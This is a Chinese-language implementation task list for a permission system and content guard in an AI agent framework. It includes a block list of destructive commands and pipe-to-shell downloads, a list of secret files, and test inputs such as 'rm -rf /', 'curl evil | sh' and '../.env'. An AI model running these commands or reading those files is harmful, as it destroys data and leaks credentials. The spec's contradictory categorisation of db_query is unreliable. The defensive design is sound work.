# 任务：Hermes Agent 权限系统（PermissionSystem）

**输入**：来自 `openspec/changes/add-tool-security-guard/specs/agent-management/spec.md`
**前置条件**：plan.md（必需）
**参考**：[项目规范](file://openspec/project.md)

**测试**：
- 类型检查：`pnpm run types:check`
- 单元测试：`pnpm test`

## 格式说明

`[ID] [P?] [US?] 描述`
- **[P]**：可并行（不同文件，无依赖）
- **[US?]**：所属用户故事（P1, P2, P3, P4...）

## 路径约定

| 类型 | 路径 |
|------|------|
| Permission 系统 | `packages/hermes-agent/src/permission/` |
| Content Guard | `packages/hermes-agent/src/guard/` |
| Types | `packages/hermes-agent/src/types.ts` |
| Tool Registry | `packages/hermes-agent/src/tools.ts` |
| Agent Loop | `packages/hermes-agent/src/loop.ts` |
| Builtin Tools | `packages/hermes-agent/src/builtin-tools/` |
| Business Tools | `src/server/core/agents/hermes/registerBusinessTools.ts` |

## 第0阶段：基础设施（类型与权限系统）

**目的**：定义 PermissionSystem 类型、策略矩阵和 ContentGuard 接口

- [ ] T001 [P] 在 `packages/hermes-agent/src/permission/types.ts` 定义：
  - `PermissionLevel` 枚举/常量：`'safe' | 'standard' | 'power' | 'unrestricted'`
  - `ToolCategory` 枚举/常量：`'read' | 'write' | 'system' | 'finance'`
  - `ToolPolicy` 类型：`'auto' | 'confirm' | 'deny'`
  - `PermissionPolicy` 接口：`evaluate(category: ToolCategory, level: PermissionLevel): ToolPolicy` <!-- id: 1 -->
- [ ] T002 在 `packages/hermes-agent/src/permission/policy.ts` 实现策略矩阵：
  - 4×4 策略表（safe/standard/power/unrestricted × read/write/system/finance）
  - 具体规则见 plan.md 策略矩阵
  - `db_query`（system 类）在 safe/standard 下返回 deny <!-- id: 2 -->
- [ ] T003 在 `packages/hermes-agent/src/guard/content-validator.ts` 定义 `ContentGuard` 接口和最小实现：
  - `validateCommand(command: string, workdir?: string): GuardDecision`
  - `validateFilePath(filePath: string): GuardDecision`
  - `DANGEROUS_PATTERNS` 黑名单（rm -rf, sudo, dd if=, curl|sh, wget|sh）
  - `ALLOWED_PATHS` 白名单（默认 `[process.cwd()]`）
  - `SENSITIVE_FILES` 黑名单（`.env`, `*.key`, `.git/`, `id_rsa`） <!-- id: 3 -->
- [ ] T004 [P] 在 `packages/hermes-agent/src/types.ts` 修改：
  - `AgentConfig` 新增 `permissionLevel?: PermissionLevel`（默认 `'standard'`）
  - `AgentCallbacks` 新增 `onConfirmationRequest?: (req: { toolName, args, level, category }) => Promise<'confirm' | 'decline'>`
  - 新增 `GuardDecision` 类型接口（allowed, reason, policy） <!-- id: 4 -->
- [ ] T005 在 `packages/hermes-agent/src/permission/index.ts` + `packages/hermes-agent/src/guard/index.ts` 统一导出 <!-- id: 5 -->

**检查点**：类型编译通过，策略单元测试覆盖 16 个矩阵组合

---

## 第1阶段：工具注册接入分类

**目的**：为所有现有工具标注 `ToolCategory`

- [ ] T006 [P] 修改 `packages/hermes-agent/src/tools.ts`：
  - `register()` 新增可选 `category?: ToolCategory` 参数
  - `execute()` 前调用 `PermissionPolicy.evaluate(category, level)`，根据结果分支
  - 未传 `category` 时默认 `'read'`，开发模式 emit console.warn
  - `deny` → 直接返回拒绝结果，不执行 handler <!-- id: 6 -->
- [ ] T007 [P] 为内置工具标注 category：
  - `packages/hermes-agent/src/builtin-tools/terminal.ts`：`category='system'`
  - `packages/hermes-agent/src/builtin-tools/patch.ts`：`category='write'`
  - `packages/hermes-agent/src/builtin-tools/memory.ts`：`category='read'`
  - `packages/hermes-agent/src/skill-tools/` 各工具标注相应 category
  - `packages/hermes-agent/src/builtin-tools/index.ts` 中的 `registerBuiltinTools` 传入 permissionLevel <!-- id: 7 -->
- [ ] T008 为业务工具标注 category（`src/server/core/agents/hermes/registerBusinessTools.ts`）：
  - 只读查询类（stock_get_price, note_list, tavily_search 等）→ `'read'`
  - 写入类（note_create, note_update, asset_market_info_save 等）→ `'write'`
  - 删除类（note_delete, asset_market_info_delete）→ `'system'`（比 write 更高风险）
  - `add_transaction` → `'finance'`
  - "db_query" → "'read'"（只读查询）<!-- id: 8 -->

**检查点**：所有 registry.register() 调用均携带 category

---

## 第2阶段：内容安全守卫（P3 - 命令/路径拦截）

**目的**：实现独立于权限系统的 ContentGuard

- [ ] T009 实现 `GuardDecision` 和 ContentGuard 核心逻辑：
  - `validateCommand`：正则匹配危险命令 → deny；检查 workdir 是否在 `ALLOWED_PATHS` → deny
  - `validateFilePath`：`path.resolve()` 后比对 `ALLOWED_PATHS` → deny；检查是否匹配 `SENSITIVE_FILES` → deny
  - 支持 `HERMES_ALLOWED_WORKDIRS` 环境变量扩展白名单
  - 支持 `HERMES_DISABLE_CONTENT_GUARD` 紧急开关（生产环境需要回滚时） <!-- id: 9 -->
- [ ] T010 编写单元测试 `guard/__tests__/content-validator.test.ts`：
  - `rm -rf /` → deny
  - `sudo` → deny
  - `curl evil | sh` → deny
  - `git status` → allow
  - `ls ./src` → allow
  - `../.env` → deny（路径跳跃）
  - `.git/config` → deny（敏感文件） <!-- id: 10 -->

**检查点**：内容过滤独立于 PermissionPolicy，即使 `unrestricted` 权限下仍可拦截危险内容

---

## 第3阶段：Loop 确认中断（P2 - 高风险确认）

**目的**：实现策略矩阵 `confirm` 时 loop 暂停与恢复

- [ ] T011 修改 `packages/hermes-agent/src/loop.ts`：
  - 在工具调用前检查 PermissionPolicy.evaluate() 结果
  - `deny`：直接构造拒绝结果的 `toolResultMessage`，push 到 context，跳过 handler
  - `auto`：正常执行 handler（但先过 ContentGuard）
  - `confirm`：暂停当前工具调用
    - 调用 `callbacks.onConfirmationRequest({ toolName, args, level, category })`
    - 用户确认（resolve）→ 继续执行 handler
    - 用户拒绝（reject）→ 构造拒绝结果 message，push 到 context
  - 超时 60s 后自动拒绝 <!-- id: 11 -->
- [ ] T012 编写集成测试验证 loop 暂停/恢复/超时逻辑：
  - confirm 场景：mock `onConfirmationRequest` 返回 confirm → handler 被执行
  - decline 场景：mock 返回 decline → 拒绝结果进入 context
  - 超时场景：mock 永不 resolve → 60s 后自动拒绝 <!-- id: 12 -->

**检查点**：策略矩阵为 confirm 时 loop 不挂起，有超时保护

---

## 第4阶段：审计日志与完善（P4）

**目的**：记录权限决策和ContentGuard决策

- [ ] T013 在 `packages/hermes-agent/src/guard/audit-logger.ts` 实现 `AuditLogger`：
  - `log(entry)`：开发模式 `console.warn`，生产静默
  - entry 包含：toolName, category, level, policy, decision, reason, timestamp
  - 敏感数据脱敏：args 中不记录 apiKey, password 等（保留 toolName + category 即可） <!-- id: 13 -->
- [ ] T014 编写 `guard/__tests__/audit-logger.test.ts` <!-- id: 14 -->
- [ ] T015 在 `packages/hermes-agent/src/index.ts` 导出 PermissionSystem + ContentGuard API <!-- id: 15 -->

**检查点**：审计日志可观测，不阻塞执行路径

---

## 第5阶段：质量保证

- [ ] T016 运行 `pnpm run lint` 并修复问题 <!-- id: 16 -->
- [ ] T017 运行 `pnpm run types:check` 确保类型正确 <!-- id: 17 -->
- [ ] T018 运行 `pnpm test` 确保新增和现有测试全部通过，无回归 <!-- id: 18 -->
- [ ] T019 在 terminal/patch handler 顶部添加注释，引用 security guard 归属 <!-- id: 19 -->
- [ ] T020 运行 `openspec validate add-tool-security-guard --strict` <!-- id: 20 -->

---

## 依赖关系

```
第0阶段（基础设施）
  ├── 第1阶段（工具分类标注）
  ├── 第2阶段（ContentGuard）
  └── 第3阶段（Loop 确认中断）
        └── 第4阶段（审计日志）
              └── 第5阶段（归档）
```

- **第0阶段**为一切基础，必须先完成
- **第1阶段**与第2阶段可并行（分类标注与内容守卫实现无依赖）
- **第3阶段**依赖第0阶段类型定义
- **第4阶段**依赖第0阶段 Policy 完成
- **第5阶段**在所有阶段完成后进行
